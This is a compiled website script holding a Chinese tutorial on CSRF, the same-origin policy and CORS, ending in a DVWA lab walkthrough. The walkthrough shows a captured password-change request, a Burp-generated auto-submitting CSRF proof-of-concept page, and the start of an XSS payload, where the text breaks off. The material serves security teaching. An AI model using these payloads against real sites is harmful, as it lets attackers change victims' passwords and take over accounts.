"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[4885],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,t]of s)a[i]=t;return a}},95557:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>g,data:()=>B});var t=a(6254);const n=a.p+"assets/img/image-20240918223718-rpe8m6l.a9a99991.png",l=a.p+"assets/img/image-20240918183204-hijttk5.7b33a1a1.png",h=a.p+"assets/img/image-20240918183504-s3wqdpx.14c674af.png",e=a.p+"assets/img/image-20240918194256-pw9oock.9b2c0b20.png",p=a.p+"assets/img/image-20240918193516-gnomibr.e6d2a892.png",k=a.p+"assets/img/image-20240918193748-gcc3yig.44494fb4.png",r=a.p+"assets/img/image-20240918202104-jjuzwk1.aee73490.png",d={},g=(0,a(81021).A)(d,[["render",function(i,s){return(0,t.uX)(),(0,t.CE)("div",null,s[0]||(s[0]=[(0,t.Fv)('<p>跨站请求伪造(Cross-site request forgery,CSRF)是一种攻击，它强制终端用户在当前对其进行&lt;span data-type=&quot;text&quot; style=&quot;color: var(--b3-font-color9);&quot;&gt;身份验证后的Web应用程序<br> 上执行非本意的操作&lt;span&gt;。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数据，因为攻击者无法查看对伪造请求的响应</p><h3 id="csrf漏洞的原理" tabindex="-1"><a class="header-anchor" href="#csrf漏洞的原理"><span>CSRF漏洞的原理</span></a></h3><p>(用DVWA举例)</p><ol><li><p><code>47.113.187.190:36974/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</code>这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造。</p></li><li><p>目的：我们可以伪造请求，修改他人信息</p><p>条件：<span data-type="text" style="color:var(--b3-font-color9);">1.对方也登陆的该网站 2.对方点击了链接触发修改信息的伪请求</span>（二者缺一不可）</p></li></ol><figure><img src="'+n+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><h3 id="防御措施" tabindex="-1"><a class="header-anchor" href="#防御措施"><span>防御措施</span></a></h3><p>防止这些操作出现被伪造的情况，从而导致CSRF。</p><ol start="0"><li>验证<span data-type="text" style="color:var(--b3-font-color9);">Referer</span>，如果Referer是其他网站的话，就可能是CSRF攻击。检测绕过：referer头留空</li><li>对敏感信息的操作增加安全的<span data-type="text" style="color:var(--b3-font-color9);">token</span>，可以在HTTP请求中参数形式加入一个随机token，并在服务器端建立拦截器验证token。</li><li>对敏感信息的操作前增加<span data-type="text" style="color:var(--b3-font-color9);">二次验证</span>；</li><li>及时退出网站，不随意点击链接/图片。</li></ol><h3 id="把token放置在cookiet中-能否防护csrf" tabindex="-1"><a class="header-anchor" href="#把token放置在cookiet中-能否防护csrf"><span>把token放置在cookiet中，能否防护csrf</span></a></h3><p>不能，csrf冒用cookie,放置在cookie中直接被利用</p><h3 id="csrf需不需要获取cookie" tabindex="-1"><a class="header-anchor" href="#csrf需不需要获取cookie"><span>CSRF需不需要获取cookie</span></a></h3><p>不需要，cookie是存储在浏览器内，不需要获取cookie,本质是在冒用用户cookie</p><h3 id="csrf与xss的区别" tabindex="-1"><a class="header-anchor" href="#csrf与xss的区别"><span>CSRF与XSS的区别</span></a></h3><ol><li>XSS攻击的是客户端，CSRF攻击的是服务端</li><li>XSS主要是获取身份信息cookie.csrf是冒用用户身份，不获取cookie</li><li>XSS是将语句插入html页面中，盗取到了用户的权限，然后实施破坏。</li><li>CSRF是冒用用户身份，借用户的权限完成攻击，攻击者并没有拿到用户的权限。</li><li>CSRF危害更大，防御难度比XSS高</li></ol><h3 id="同源策略" tabindex="-1"><a class="header-anchor" href="#同源策略"><span>同源策略</span></a></h3><p>如果两个页面的<span data-type="text" style="color:var(--b3-font-color9);">协议</span>，<span data-type="text" style="color:var(--b3-font-color9);">端口</span>（如果有指定）和<span data-type="text" style="color:var(--b3-font-color9);">域名</span>都相同，则两个页面具有相同的源；是浏览器用于隔离潜在恶意文件的重要安全机制。不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。</p><h4 id="受约束对象" tabindex="-1"><a class="header-anchor" href="#受约束对象"><span>受约束对象</span></a></h4><p>DOM、Cookie、第三方插件、XMLHttpRequest</p><h4 id="不受约束对象" tabindex="-1"><a class="header-anchor" href="#不受约束对象"><span>不受约束对象</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">页面中的链接\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;a </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">href</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&gt;、重定向、表单action:\\=””，提交是不会受到同源策略限制的。</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的\\&lt;script\\&gt;,\\&lt;img\\&gt;,\\&lt;link\\&gt;,\\&lt;iframe\\&gt;等带src属性的标签。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="非同源受到的限制" tabindex="-1"><a class="header-anchor" href="#非同源受到的限制"><span>非同源受到的限制</span></a></h4><p>Cookie、LocalStorage、IndexDB无法读取、DOM无法获得、AJAX请求不能发送</p><h3 id="跨域" tabindex="-1"><a class="header-anchor" href="#跨域"><span>跨域</span></a></h3><p>受同源策略的影响，<span data-type="text" style="color:var(--b3-font-color9);">不是同源的脚本不能操作其他源下面的对象</span>。想要操作另一个源下的对象是就需要跨域，把<span data-type="text" style="color:var(--b3-font-color9);">不同域之间请求数据的操作，称为跨域</span>。</p><h3 id="跨域方法" tabindex="-1"><a class="header-anchor" href="#跨域方法"><span>跨域方法</span></a></h3><h4 id="document-domain跨域" tabindex="-1"><a class="header-anchor" href="#document-domain跨域"><span>document.domain跨域</span></a></h4><p>若两个页面一级域名相同，只是二级域名不同，那么<span data-type="text" style="color:var(--b3-font-color9);">浏览器可以通过设置document.domain来共享Cookie</span></p><p><strong>注意</strong></p><p>1.只能在<span data-type="text" style="color:var(--b3-font-color9);">父域名与子域名</span>之间使用<br> 2.存在安全性问题，当一个站点被攻击后，另一个站点会引起安全漏洞<br> 3.只适用于Cookie和iframe窗口。</p><h4 id="jsonp跨域" tabindex="-1"><a class="header-anchor" href="#jsonp跨域"><span>JSONP跨域</span></a></h4><p>利用&lt;script&gt;的src不受同源策略约束实现跨域获取数据。<br> Jsonp(JSON with Padding)是json的一种&quot;<span data-type="text" style="color:var(--b3-font-color9);">使用模式</span>&quot;，可以让网页从<span data-type="text" style="color:var(--b3-font-color9);">别的域名（网站）那获取资料</span>，即跨域读取数据。</p><p><strong>注意</strong></p><p>1.存在安全性问题，需要网站双方商议基础token的身份验证<br> 2.只能是GET,不能POST<br> 3.可能被注入恶意代码，篡改页面内容，可以采用字符串过滤来规避此问题。</p><h4 id="cors跨域" tabindex="-1"><a class="header-anchor" href="#cors跨域"><span>CORS跨域</span></a></h4><p><span data-type="text" style="color:var(--b3-font-color9);">CORS全称Cross-Origin Resource Sharing</span>,跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，不同于古老的<br> jsonp只能get请求。CORS允许浏览器向跨域服务器发出XMLHttpRequest请求。如果</p><p>利用JavaScript无法控制HTTP头的特点，通过目标返回的HTTP头授权是否允许跨域访问。</p><p>Access-Control-Allow-Origin:a.baidu.com #b.baidu.com可以访问我的资源</p><p>Access-Control-Allow-Origin:null #谁都可以访问 有的浏览器不支持这样写</p><p>Access-Control-Allow-Origin:* #谁都可以访问</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com想得到b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com中的内容，在b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com里面添加响应头声明允许a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com的访问</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">添加：Access</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Control</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Alow</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Origin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com然后a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com就可以用ajax获取b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">com里的数据了</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="跨域利用" tabindex="-1"><a class="header-anchor" href="#跨域利用"><span>跨域利用</span></a></h4><ol><li>同于csrf跨站请求伪造，发送钓鱼链接，读取用户敏感数据。</li><li>跨站请求，获取cookie</li><li>请求攻击服务器的恶意js等代码</li></ol><h3 id="dvwa中利用xss漏洞和csrf漏洞修改密码" tabindex="-1"><a class="header-anchor" href="#dvwa中利用xss漏洞和csrf漏洞修改密码"><span>DVWA中<strong>利用XSS漏洞和csrf漏洞修改密码</strong></span></a></h3><ol><li><p>登陆DVWA靶场</p><p>目前账号密码为：admin/password</p></li><li><p>攻击者通过CSRF模块抓包</p><figure><img src="'+l+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>攻击者提取到的修改密码的包</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">GET</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">vulnerabilities</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">csrf</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">password_new</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">123456</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">password_conf</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">123456</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Change</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Change</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> HTTP</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1.1</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Host</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 47.113.187.190</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">36974</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">User</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Mozilla</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Windows</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> NT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Win64</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">x64</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">rv</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">130.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">Gecko</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">20100101</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> Firefox</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">130.0</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">text</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">application</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">xhtml</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">xml</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">application</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">xml</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.9</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">avif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">webp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">png</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">svg</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">xml</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">/*;q=0.8</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Accept-Encoding: gzip, deflate, br</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Connection: close</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Referer: http://47.113.187.190:36974/vulnerabilities/csrf/</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Cookie: PHPSESSID=9sn4v5t9pr06kaqlmpmhetkds4; security=low</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Upgrade-Insecure-Requests: 1</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">Priority: u=0, i</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>攻击者伪造该包</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">  &lt;!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-- </span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">CSRF</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> PoC</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> generated</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> by</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> Burp</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> Suite</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> Professional</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> --</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">  &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">    &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">form</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://47.113.187.190:51594/vulnerabilities/csrf/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">      &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">input</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hidden&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;password&amp;#95;new&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;123456&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">      &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">input</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hidden&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;password&amp;#95;conf&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;123456&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">      &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">input</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hidden&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Change&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Change&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">      &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">input</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;submit&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Submit request&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">    &lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">form</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">    &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">      history</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pushState</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;/&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">      document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">forms</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">submit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">    &lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">  &lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+h+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>其次我们在XSS模块注入用户触发改密码的a标签</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">payload：</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> href</span><span 